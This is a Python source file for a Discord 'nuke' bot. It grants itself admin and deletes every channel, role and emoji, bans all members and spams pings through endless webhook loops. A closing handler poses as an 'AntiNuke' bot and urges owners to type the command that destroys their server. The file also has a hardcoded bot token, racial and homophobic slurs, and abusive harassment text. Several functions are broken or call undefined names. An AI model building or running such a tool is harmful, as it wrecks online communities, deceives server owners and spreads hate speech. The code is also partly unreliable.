token = "Nzk0MDUyNzc5Mzk0OTkwMTEy.X-1NRw.iBZz-ezci0Zdqeg67k2ElisFfcg"
prefix = "."
#☫CONFIG FOR NUKE☫#
spam_messages = ["@everyone add More5#5555", "@everyone your gay"]
channel_names = ["More#5555", "More5#5555 brainfucked you"]
webhook_usernames = ["More5#5555W", "More5#5555W"]
rename_to = ["death upon me"]
server_name = ["Add More5#5555"]
emoji_name = ["DevilLove"]
#↠RECOMMEND KEEPING THESE DEFAULT↞#
nuke_on_join = False
nuke_wait_time = 0
#︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵
#lol                                                                                                                   〕  〕
#faggot                                                                                                                〕  〕 
#failure                                                                                                               〕  〕 
#failed abortion                                                                                                       〕  〕
#adopted kid                                                                                                           〕  〕
#parents are dead and im smoking there ashes                                                                           〕  〕
#lol ima record it to and send it to you                                                                               〕  〕 
#fucking waste of sperm                                                                                                〕  〕
#︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶
#↡the code↡－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－#
import discord, random, aiohttp, asyncio
import time
from time import sleep
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S

bot = commands.Bot(command_prefix = prefix, intents = discord.Intents.all())

@bot.event
async def on_ready():
  print(f"""
{S.BRIGHT}{C.BLUE}More5#5555 W│ 〝〞{S.NORMAL} 
script is connected to {C.BLUE}{bot.user}
{C.BLUE}---------------------------------------------------- 
{C.BLUE}Rise Of More5
{C.BLUE}----------------------------------------------------
{C.BLUE}type {C.BLUE}{prefix}setup {C.BLUE}in any server to demolish it 
{C.BLUE}----------------------------------------------------
{C.BLUE}type {C.BLUE}{prefix}help {C.BLUE}in any server so you can get the commands and demolish it 
{C.BLUE}----------------------------------------------------
{C.BLUE}Your bots link is
{C.BLUE}---------------------------------------------------- 
{C.BLUE}https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot 
{C.BLUE}----------------------------------------------------
      {C.BLUE}Go Fuxk Em Up""") 


bot.remove_command("help")

@bot.command()
async def help(ctx):
  await ctx.message.delete()
  author = ctx.author
  help = discord.Embed(
    title = "your a failure kid",
    description = """lol cry yourself to sleep kid

COMMANDS

.help
gives commands to nuker in dms

.setup
demolishes the server 

.droles
deletes all roles

.sall
Spams messages in all channels

.droles
delets all roles 

 .ccr
 mass creates channels and spam ping while bannin
 
 .demoji
 deletes all the emojis (this is a slow commamd)

 .mrole
 mass creates roles 

 .admin
 gives you admin in the server 

.rall
renames every1 ina server 

.logout
logs out the bot

if you see this your server is prolly getting destroyed rn
""")
  await author.send(embed = help)


async def nuke(guild):
  print(f"{C.WHITE}givin admin in {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}successfully granted admin permissions in {C.WHITE}{guild.name} Now Nuke It Pussy")
  except:
    print(f"{C.RED}admin permissions couldnt be granted make sure the bot has admin perms fag {C.WHITE}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted shitty channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}shitty channel has not been deleted.")
  for member in guild.members:
    try:
      await member.ban(reason = "More5 Banned You Pussy")
      print(f"{C.GREEN}banned fuckboy {member.name} from {server.name}shitty server{C.WHITE}") 
    except:
      print(f"{C.WHITE}{member.name} {C.RED}fuckboy has not been banned.")
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
  print(f"{C.GREEN}Nuked {guild.name}.")
  
@bot.command()
async def setup(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

@bot.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await nuke(guild)
  else:
    return
  
@bot.command()
async def sall(ctx, *, message = None):
  if message == None:
    for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(spam_messages))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"{C.RED}Sall Error {C.WHITE}[cannot send godly messages 😞 ]")
        return
      except:
        pass

@bot.command()
async def ccr(ctx, amount = 500, *, name = None):
  if name == None:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print(f"{C.RED}ccr Error {C.WHITE}[cannot create godly channel 😞]")
        return
      except:
        pass
  else:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print(f"{C.RED}ccr error {C.WHITE}[cannot create channel]")
        return
      except:
        pass

@bot.command()
async def cdel(ctx):
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted shitty channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")

@bot.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "Death Upon You │ Show No Mercy")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
@bot.command()
async def droles(ctx):
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"{C.GREEN}Successfully deleted shitty role {C.WHITE}{role.name}")
    except:
      print(f"{C.RED}shitty {C.WHITE}{role.name} {C.RED}has not been deleted.")
      
@bot.command()
async def demoji(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f" ugly {emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f" ugly {emoji.name} has not been deleted in{ctx.guild.name}")
                
@bot.command()
async def mrole(ctx): 
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="DARK NUKED U, DARK OWNS U, YOUR DARKS SEED")

@bot.command()
async def logout(ctx):
  await ctx.message.delete()
  exit()

@bot.command(pass_context=True)
async def rall(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f" niggerboy {user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f" niggerfag {user.name} has not been renamed to {rename_to} in {ctx.guild.name}")
        print ("yur you own every1 now ;)")

@bot.command
async def sr(ctx, *, server_name):
    if not await hasTarget(ctx):
        return
    try:
        await selected_server.edit(name=server_name)
        await (f' server name has been changed to godly `{name}`.')
    except:
        await ('cannot change shitty servers name to {name}')
        raise

@bot.command(name='addEmoji', aliases=['aEmoji', 'aEm'])
async def ae(ctx, item, *, name=emoji_name, bits=None):
    if not await hasTarget(ctx):
        return

    if bits is None:
        # Raw IPv4 and IPv6 are not supported
        if item.startswith(('https://', 'http://', 'ftp://', 'ftps://')): # Link EX: https://www.example.com/aaa.png
            try:
                if name is None:
                    await log(ctx, 'Name for emoji? I\'m not gonna always name it for you...')
                    return 
                await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(item).content).read())
                await log(ctx, 'Successfully changed the current server icon.')
            except:
                raise

        elif item[0] == '<': # EX: <a:triggeredd:627060014431076352>
            item = item.split(':')
            if name is None:
                name = item[1]
            try:
                if item[0] == '<a': # Animated
                     await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{item[2][:-1]}.gif?v=1').content).read())
                else:
                    await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{item[2][:-1]}.png?v=1').content).read())
                await log(ctx, f'Successfully added emoji: {name}')
            except:
                raise

        elif os.path.isfile(item): # File EX: C:\Users\user\Desktop\something.jpg or EX: .\icon\something.jpg
            with open(item, 'rb') as data:
                await selected_server.create_custom_emoji(name=(name), image=data.read())
                await log(ctx, f'Successfully added emoji: {name}')
        else:
            await log(ctx, 'Bad path to image.')
    else:
        selected_server.create_custom_emoji(name=(name), image=bits)

@bot.command(name='changeStatus', aliases=['cs'])
async def cs(ctx, status):
    if status == 'offline':
        await bot.change_presence(status=discord.Status.offline)
    elif status == 'invisible':
        await bot.change_presence(status=discord.Status.invisible)
    elif status == 'online':
        await bot.change_presence(status=discord.Status.online)
    elif status == 'idle':
        await bot.change_presence(status=discord.Status.idle)
    elif status == 'dnd' or status == 'do_not_disturb':
        await bot.change_presence(status=discord.Status.do_not_disturb)

@bot.command(name='bans')
async def cbans(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Bans', [s.user for s in await selected_server.bans()])

@bot.command(name='checkRolePermissions', aliases=['check', 'crp'])
async def crp(ctx, name, n='1'):
    if not await hasTarget(ctx):
        return
    if not n.isdigit() or (n := int(n) - 1) < 0:
        await log(ctx, 'Bad page number.')
        return
    member = containing(selected_server.members, nameIdHandler(name))
    if member is None:
        await log(ctx, f' cannot {name}.')
        return

@bot.command(name='leave')
async def leave(ctx, name=None):
    if name is None:
        if not await hasTarget(ctx):
            return
        await selected_server.leave()
    else:
        server = containing(bot.guilds, name)
        if server is None:
            await log(ctx, f'Unable to find server {name}.')
            return
        await server.leave()

        await log(ctx, f' left shitty {name}.')

if __name__ == "__main__":
  print(f"""
  {C.BLUE}
_░▒███████
░██▓▒░░▒▓██
██▓▒░__░▒▓██___██████
██▓▒░____░▓███▓__░▒▓██
██▓▒░___░▓██▓_____░▒▓██
██▓▒░_______________░▒▓██
 ██▓▒░______________░▒▓██
  ██▓▒░____________░▒▓██
   ██▓▒░__________░▒▓██
    ██▓▒░________░▒▓██ 
    ▀████▄     ▄███▀                                  
      ████    ████                                    
      █ ██   ▄█ ██   ▄██▀██▄▀███▄███  ▄▄█▀██  █▄▄▄▄▄▄ 
      █  █▓  █▀ ██  ██▀   ▀██ ██▀ ▀▀ ▄█▀   ██▄█       
      ▓  █▓▄█▀  ██  ██     ██ █▓     ▓█▀▀▀▀▀▀█████▄▄  
      ▓  ▀▓█▀   ██  ██     ▓█ █▓     ▓█▄    ▄     ▀██ 
      ▓  ▓▓▓▓▀  ▓▓  ▓█     ▓▓ ▓▓     ▓▓▀▀▀▀▀▀▓▓▓▓█▓▓  
      ▒  ▀▓▓▀   ▓▓  ▓▓▓   ▓▓▓ ▓▒     ▒▓▓          ▀▓▓ 
    ▒ ▒▒▒ ▒   ▒ ▒▒▒  ▒ ▒ ▒ ▒▒ ▒▒▒     ▒ ▒ ▒▒ ▒     ▒  
                                            ▒▒▒  ▒▒▒  
                                             ▒▒▒▒▒
{C.BLUE}----------------------------------------------------                                             

                       {C.BLUE}
                       Fuck ya server n the niggas in there
                                Sped Ass Nigga
  """)
  try:
    bot.run(token)
  except discord.LoginFailure:
    print(f"{C.RED}client failed to log in  {C.WHITE}[wrong token or invalid dumbass]")
  except discord.HTTPException:
    print(f"{C.RED}client failed to log in {C.WHITE}[unknown error]")

@bot.event
async def on_guild_join(guild):
    embed = discord.Embed(title='Dark Anti', color=0xaa0000)
    embed.add_field(name="Hey Thanks For Adding Me To Your Server Im A AntiNuke In Process Made By Dark", value='\nTry typing .setup to get started.', inline=False)
    embed.set_footer(text='Thanks for adding Dark Anti to your server!')
    await guild.system_channel.send(embed=embed)
    print(f'{C.BGREEN}>>> {C.BARKRED}[GUILD JOINED] {C.BLACK}ID: {guild.id} Name: {guild.name}{C.GREEN} <<<\n {C.BLACK} Total Guilds: {len(bot.guilds)}{C.YELLOW}')

    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="people do .setup"))
    sleep[5]
    await bot.change_presence(activity=discord.Game(name="with your mom"))
    sleep[5]
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="to your sextape ;)"))
    sleep[5]
    await bot.change_presence(activity=discord.Streaming(name = "💙", url = "https://www..twitch.tv/monstercat"))
    sleep[5]
